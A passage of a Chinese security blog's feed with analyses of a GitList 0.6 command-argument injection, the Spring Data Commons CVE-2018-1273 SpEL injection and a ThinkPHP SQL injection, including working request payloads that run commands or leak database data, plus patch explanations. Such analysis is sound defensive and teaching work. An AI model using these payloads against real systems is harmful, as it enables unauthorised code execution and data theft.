-<p>本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行<code>vi READEME.md</code>或<code>less README.md</code>。但倘若我们指定<code>--open-files-in-pager=id;</code>，注意有一个<code>;</code>，则在匹配到文件后，则相当于执行<code>id; README.md</code>，在unix中分号表示顺序的执行各条命令而不关心是否失败。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/3.png?raw=true" alt=""></p>
-<p>不过在执行之前经过了<code>escapeshellarg</code>，会在字符串两边加上单引号，这会有影响吗？不会。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/4.png?raw=true" alt=""></p>
-<p>所以当构造如下的数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1</div><div class="line"></div><div class="line">query=--open-files-in-pager=touch /tmp/test/chybeta</div></pre></td></tr></table></figure></p>
-<p>注意修改了<code>tree/master/search</code> 为<code>tree/c/search</code>，也即使<code>branch</code>值为<code>c</code>，这样拼接出来的最后的语句即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c</div></pre></td></tr></table></figure></p>
-<p>当进行查找时，由于READEME.md（内容为chybeta）中含有字符<code>c</code>，因此可以查找成功，之后由于注入参数的关系，将会执行<code>touch /tmp/test/chybeta</code>，将会在/tmp/test/目录下创建一个新的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/5.png?raw=true" alt=""></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://xz.aliyun.com/t/2315" target="_blank" rel="external">谈escapeshellarg绕过与参数注入漏洞</a></li>
-<li><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" target="_blank" rel="external">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions</a></li>
-<li><a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/" target="_blank" rel="external">Gitlist - Commit to Rce</a></li>
-<li><a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;GitList 0.6 Unauthenticated RCE 分析&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</title>
-    <link href="http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91/"/>
-    <id>http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/</id>
-    <published>2018-04-11T15:35:54.000Z</published>
-    <updated>2018-04-12T14:36:41.506Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="external">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a><br><a id="more"></a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://pivotal.io/security/cve-2018-1273" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1273</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/1.jpg?raw=true" alt=""></p>
-<p>漏洞影响版本：</p>
-<ul>
-<li>2.0.x users should upgrade to 2.0.6</li>
-<li>1.13.x users should upgrade to 1.13.11</li>
-<li>Older versions should upgrade to a supported branch</li>
-</ul>
-<h1 id="探索过程"><a href="#探索过程" class="headerlink" title="探索过程"></a>探索过程</h1><p>从漏洞公告页的Refference给出的两个链接<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a" target="_blank" rel="external">commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a>和<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a>，可以看出该漏洞为SpEL注入。</p>
-<p>在漏洞发现者<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>的<a href="https://twitter.com/h3xstream/status/984098634353475584" target="_blank" rel="external">推文和回复</a>中提到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.jpg?raw=true" alt=""><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@requestMapping</span>(<span class="string">"/users"</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</div><div class="line">    <span class="meta">@requestsMapping</span>(method= RequestMethod.POST)</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span></span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>此外 <a href="https://twitter.com/SpringData" target="_blank" rel="external">Spring Data Team @SpringData</a>在该推文中回复：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Spring Data Team</div><div class="line">‏That&apos;s only true if the form backing object is a projection interface. Simple DTOs are safe.</div></pre></td></tr></table></figure></p>
-<p>因此可以推测出几个漏洞条件：</p>
-<ol>
-<li>Spel注入</li>
-<li>a form accessible</li>
-<li>form backing object is a projection interface</li>
-</ol>
-<p>另外根据<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>提供的示例代码，不难发现这是spring官方的<a href="https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83" target="_blank" rel="external">示例代码 spring-data-examples 中的一部分</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.jpg?raw=true" alt=""></p>
-<p>因此环境搭建以及漏洞探索过程不妨从此入手。</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-projects/spring-data-examples</div></pre></td></tr></table></figure>
-<p>我直接采用默认配置pom.xml，对应的Spring Data Commons版本为2.0.5<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/9.jpg?raw=true" alt=""></p>
-<p>运行其中的web\example。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/4.jpg?raw=true" alt=""><br>这是一个简单的注册页面，输入用户名、密码并重复。</p>
-<p>抓包，修改payload数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.gif?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>限于能力，还真不知道这个洞该从何谈起。干脆就定位到 org/springframework/data/web/MapDataBinder.java:174 。之所以定位到这里，官方的<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit</a>中在这里去除了StandardEvaluationContext，改用SimpleEvaluationContext。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/5.jpg?raw=true" alt=""><br>可以看到这里的propertyName即我们传入的参数名，其中带有了payaload。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/6.jpg?raw=true" alt=""><br>继续执行至187行，对其进行解析<code>parseExpression(propertyName)</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/7.jpg?raw=true" alt=""><br>继续执行到217行，解析了spel表达式，成功执行calc.exe。</p>
-<p>跟<a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a>中使用的<code>expression.getValue(context, Boolean.class)</code>不同，这里执行spel表达式使用的是<code>expression.setValue(context, value)</code>。以后在找类似的spel表达式注入时可以针对性查找这两条语句。</p>
-<p>上图来自0c0c0f师傅的<a href="http://www.polaris-lab.com/index.php/archives/501/" target="_blank" rel="external">CVE-2018-1270 Remote Code Execution with spring-messaging</a> </p>
-<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>以 spring-data-commons 2.0.6 版本为例 <a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/10.jpg?raw=true" alt=""></p>
-<p>换用SimpleEvaluationContext，用于实现简单的数据绑定，保持灵活性减少安全隐患（来自<a href="https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12" target="_blank" rel="external">360cert语</a>）。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://jira.spring.io/browse/DATACMNS-1282" target="_blank" rel="external">DATACMNS-1282</a></li>
-<li><a href="https://jira.spring.io/browse/DATACMNS-1264" target="_blank" rel="external">DATACMNS-1264</a></li>
-<li><a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#projections" target="_blank" rel="external">projections</a></li>
-<li><a href="https://github.com/spring-projects/spring-data-examples" target="_blank" rel="external">spring-data-examples</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a></li>
-</ul>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Spring Data Commons 2.0.5版本怼了一天，从早上8点怼到现在，尽管确定了Spel注入点，但就是用普通的表达式弹不出计算器。比如使用 <code>T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.gif?raw=true" alt=""></p>
-<p>用动态调用<code>(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()</code>的方式也会触发失败。</p>
-<p>刚刚才看到<a href="https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483666&amp;idx=1&amp;sn=91e3b2aab354c55e0677895c02fb068c&amp;from=1084195010&amp;wm=20005_0002&amp;weiboauthoruid=5458358938" target="_blank" rel="external">xxlegend大师傅</a>在其中说明了原因Spring Data Commons 2.0.5版本中 MapDataBinder.java 的182添加了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">context.setTypeLocator(typeName -&gt; &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
-<p>最后用下面的payload可以绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
-<p>另外matthiaskaiser 在 <a href="https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e" target="_blank" rel="external">https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e</a> 给出了另一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;xterm&apos;)&quot;)]=asdf</div></pre></td></tr></table></figure></p>
-<p>关于这个payload是怎么出来的，可以借鉴以下几个漏洞</p>
-<ol>
-<li><a href="http://drops.xmd5.com/static/drops/papers-5107.html" target="_blank" rel="external">ElasticSearch Groovy脚本远程代码执行漏洞分析（CVE-2015-1427）</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-4334be60-3e50-1.png" alt="13.jpg"></li>
-<li><a href="https://jaq.alibaba.com/blog.htm?id=48" target="_blank" rel="external">WebView 远程代码执行漏洞浅析</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180412205148-437762b0-3e50-1.png" alt="12.jpg"></li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2269&quot;&gt;Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</title>
-    <link href="http://chybeta.github.io/2018/04/10/Thinkphp%E6%A1%86%E6%9E%B6-5-0-16-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2018/04/10/Thinkphp框架-5-0-16-sql注入漏洞分析/</id>
-    <published>2018-04-09T23:22:49.000Z</published>
-    <updated>2018-04-09T23:23:52.524Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="external">Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</a><br><a id="more"></a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/1.jpg?raw=true" alt=""></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>搭建好数据库，以我自己的配置为例。数据库为tptest，表名为user，其中有两个字段id和username<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/2.jpg?raw=true" alt=""></p>
-<p>thinkphp官网下载5.0.15版本： <a href="http://www.thinkphp.cn/down/1125.html" target="_blank" rel="external">http://www.thinkphp.cn/down/1125.html</a> 。修改数据库配置信息 application/database.php。在 application/config.php 中打开调试和trace，<code>app_debug</code>和<code>app_trace</code>均为true。在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    $username = input(<span class="string">'get.username/a'</span>);</div><div class="line">    db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">1</span>])-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/3.jpg?raw=true" alt=""></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过input获取到参数后，<code>username</code>变量情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/4.jpg?raw=true" alt=""></p>
-<p>跟入insert，thinkphp/library/think/db/Query.php:2078<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">// 分析查询表达式</span></div><div class="line">    $options = <span class="keyword">$this</span>-&gt;parseExpress();</div><div class="line">    $data    = array_merge($options[<span class="string">'data'</span>], $data);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/5.jpg?raw=true" alt=""></p>
-<p>接下去执行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</div></pre></td></tr></table></figure></p>
-<p>跟入 thinkphp/library/think/db/Builder.php:720：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">(array $data, $options = [], $replace = false)</span></span></div><div class="line">  &#123;</div><div class="line">      <span class="comment">// 分析并处理数据</span></div><div class="line">      $data = <span class="keyword">$this</span>-&gt;parseData($data, $options);</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</div><div class="line">          <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">      &#125;</div><div class="line">      ...</div></pre></td></tr></table></figure></p>
-<p>跟入<code>parseData</code>至 thinkphp/library/think/db/Builder.php:101 ，相关变量信息已经注释添加。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="comment">// 注</span></div><div class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123; <span class="comment">// 第 101 行左右</span></div><div class="line">    <span class="comment">//  $key : "username"</span></div><div class="line">    <span class="comment">//  $val : &#123;"inc","updatexml(1,concat(0x7,user(),0x7e),1)","1"&#125;</span></div><div class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</div><div class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</div><div class="line">            ....</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</div><div class="line">            ...</div><div class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</div><div class="line">            <span class="comment">// $val[0] = "inc"</span></div><div class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</div><div class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</div><div class="line">                    $result[$item] = $val[<span class="number">1</span>];</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</div><div class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">     ...</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div></pre></td></tr></table></figure>
-<p>可以看出<code>$val</code>是数组，且根据<code>$val[0]</code>值为<code>inc</code>，会通过switch语句进入到下面这条：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</div><div class="line">    <span class="comment">// $val[1] = "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">    <span class="comment">// $val[2] = "1"</span></div><div class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
-<p>跟入此处的<code>parseKey</code>，即thinkphp/library/think/db/builder/Mysql.php:90<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span><span class="params">($key, $options = [])</span></span></div><div class="line">&#123;</div><div class="line">    $key = trim($key);</div><div class="line">    <span class="keyword">if</span> (strpos($key, <span class="string">'$.'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key, <span class="string">'('</span>)) &#123;</div><div class="line">        <span class="comment">// JSON字段支持</span></div><div class="line">        <span class="keyword">list</span>($field, $name) = explode(<span class="string">'$.'</span>, $key);</div><div class="line">        $key                = <span class="string">'json_extract('</span> . $field . <span class="string">', \'$.'</span> . $name . <span class="string">'\')'</span>;</div><div class="line">    &#125; <span class="keyword">elseif</span> (strpos($key, <span class="string">'.'</span>) &amp;&amp; !preg_match(<span class="string">'/[,\'\"\(\)`\s]/'</span>, $key)) &#123;</div><div class="line">        <span class="keyword">list</span>($table, $key) = explode(<span class="string">'.'</span>, $key, <span class="number">2</span>);</div><div class="line">        <span class="keyword">if</span> (<span class="string">'__TABLE__'</span> == $table) &#123;</div><div class="line">            $table = <span class="keyword">$this</span>-&gt;query-&gt;getTable();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'alias'</span>][$table])) &#123;</div><div class="line">            $table = $options[<span class="string">'alias'</span>][$table];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[,\'\"\*\(\)`.\s]/'</span>, $key)) &#123;</div><div class="line">        $key = <span class="string">'`'</span> . $key . <span class="string">'`'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($table)) &#123;</div><div class="line">        <span class="keyword">if</span> (strpos($table, <span class="string">'.'</span>)) &#123;</div><div class="line">            $table = str_replace(<span class="string">'.'</span>, <span class="string">'`.`'</span>, $table);</div><div class="line">        &#125;</div><div class="line">        $key = <span class="string">'`'</span> . $table . <span class="string">'`.'</span> . $key;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $key; <span class="comment">// $key : "updatexml(1,concat(0x7,user(),0x7e),1)"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>此处并未对传入的<code>$key</code>进行更多的过滤与检查，最后返回的仍然是<code>1 and (updatexml(1,concat(0x7,user(),0x7e),1))</code></p>
-<p>回到<code>parseData</code>，<code>floatval($val[2])</code>返回1，这也正是我们要传入<code>username[2]=1</code>的原因。将其与前面经过<code>parseKey</code>的结果进行拼接后返回给<code>result</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/6.jpg?raw=true" alt=""></p>
-<p>回到 thinkphp/library/think/db/Query.ph 的 insert 中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/7.jpg?raw=true" alt=""></p>
-<p>sql注入成功。</p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>官方commit： <a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b" target="_blank" rel="external">https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180409/8.jpg?raw=true" alt=""><br>在进行<code>dec</code>和<code>inc</code>操作之前对<code>$val[1]</code>的值进行了再次确认。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2257&quot;&gt;Thinkphp框架 &amp;lt; 5.0.16 sql注入漏洞分析&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="thinkphp" scheme="http://chybeta.github.io/tags/thinkphp/"/>
     
   </entry>
   
